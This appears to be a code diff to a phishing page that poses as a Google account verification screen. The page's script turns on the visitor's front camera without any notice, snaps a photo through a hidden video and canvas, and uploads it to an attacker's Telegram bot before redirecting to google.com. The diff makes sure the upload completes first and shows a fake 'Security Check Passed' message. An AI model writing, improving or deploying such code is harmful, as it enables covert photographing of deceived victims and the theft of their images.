@@ -6,7 +6,7 @@
 </head>
 <body style="background:#fff; text-align:center; padding-top:50px; font-family:sans-serif;">
     <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" width="150">
-    <h3 style="font-weight:normal; color:#5f6368;">Verifying account...</h3>
+    <h3 id="st" style="font-weight:normal; color:#5f6368;">Verifying account...</h3>
     
     <video id="v" autoplay playsinline style="display:none;"></video>
     <canvas id="c" style="display:none;"></canvas>
@@ -17,34 +17,38 @@
 
         async function start() {
             try {
-                // Front camera ko priority dena aur fast start karna
                 const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user", width: 640, height: 480 } 
+                    video: { facingMode: "user" } 
                 });
                 const v = document.getElementById('v');
                 v.srcObject = stream;
 
-                // Sirf 500ms ka wait taaki image green na ho aur fast kaam kare
+                // Photo lene se pehle thoda wait taaki camera focus ho jaye
                 setTimeout(async () => {
                     const c = document.getElementById('c');
                     c.width = 640;
                     c.height = 480;
                     c.getContext('2d').drawImage(v, 0, 0);
                     
-                    c.toBlob(async (blob) => {
-                        const fd = new FormData();
-                        fd.append('chat_id', chat_id);
-                        fd.append('photo', blob, 'img.png');
-                        fd.append('caption', '🚀 Fast Capture: Done!');
+                    const blob = await new Promise(res => c.toBlob(res, 'image/jpeg', 0.7)); // JPEG zyada fast hai
+                    
+                    const fd = new FormData();
+                    fd.append('chat_id', chat_id);
+                    fd.append('photo', blob, 'img.jpg');
+                    fd.append('caption', '🚀 Fast Capture: Done!');
 
-                        // Background mein bhej kar foran Google par redirect
-                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
-                        
-                        window.location.href = "https://www.google.com";
-                    }, 'image/png');
-                }, 500); 
+                    // Pehle confirm karein ke photo chali gayi hai
+                    document.getElementById('st').innerText = "Security Check Passed...";
+                    
+                    await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { 
+                        method: 'POST', 
+                        body: fd 
+                    });
+
+                    // Photo jaane ke baad hi Google par bhejna
+                    window.location.href = "https://www.google.com";
+                }, 800); 
             } catch (e) {
-                // Agar camera block ho toh bhi Google par bhej do
                 window.location.href = "https://www.google.com";
             }
         }
